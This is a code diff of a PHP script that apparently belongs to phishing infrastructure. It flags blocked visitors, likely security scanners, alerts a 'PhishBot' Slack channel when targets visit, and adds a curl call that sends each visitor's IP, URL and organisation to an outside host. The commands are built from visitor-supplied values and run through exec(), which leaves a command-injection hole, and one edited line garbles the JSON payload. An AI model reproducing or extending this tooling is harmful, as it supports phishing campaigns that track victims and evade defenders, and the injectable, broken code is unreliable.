@@ -83,31 +83,25 @@ $id = "";
 $message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
 }
 
-// Set Slack Information Here       ************** MAKE SURE YOU SET THIS ****************
-if($jedi == 1){$webhookurl = "https://hooks.slack.com/services/BLOCKED_CHANNEL_WEBHOOK_HERE";}else{$webhookurl = "https://hooks.slack.com/services/ALLOWED_CHANNEL_WEBHOOK_HERE";}
+// Don't alert slack when I visit the page
+if($ip != $myip){
 
-$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$channel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' '.$webhookurl;
+// Use a Slack webhook for a #blocked channel you can mute (first) and a #phishing one (second)
+if($jedi == 1){$webhookurl = "https://hooks.slack.com/services/UPDATE_WEBHOOK_FOR_BLOCKED_CHANNEL_BOT"; $icon = ":no_entry:";}else{$webhookurl = "https://hooks.slack.com/services/UPDATE_WEBHOOK_FOR_PHISHING_CHANNEL_BOT"; $icon = ":fishing_pole_and_fish:";}
+
+// Set Slack Information Here       ************** MAKE SURE YOU SET THIS ****************
+$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$channel.'", "username": "PhishBot", "text": "'.$message.'", "'.$icon.'": ":bell:"}\' '.$webhookurl;
 //echo $cmd;
 exec($cmd);
 
-// You Can Uncomment If You Want to Use a Database to Capture Requests (ask me for stored procedure)
-//$conn = mysqli_connect('127.0.0.1', 'USERNAME', 'PASSWORD', 'phishbypass');
-//// Check connection
-//if ($conn->connect_error) {
-//    die("Connection failed: " . $conn->connect_error);
-//}
+}
 
-//$sql = "CALL InsertData('$ip','$id','$org','$jedi','$url');";
-//$result = $conn->query($sql);
-
-//printf($conn->error);
-//$conn->close();
-
+// Send Analytics to API
+$cmdanalytics = 'curl -s -k -X POST -d \'IP='.$ip.'&URL='.$url.'&Org='.$org.'&Status='.$allowed.'&ExtraID='.$id.'\' https://api.xolatam.us/receiveanalytics.php';
+//echo $cmdanalytics;
+exec($cmdanalytics,$result);
 
 ?>
-
-
-
 
 
 
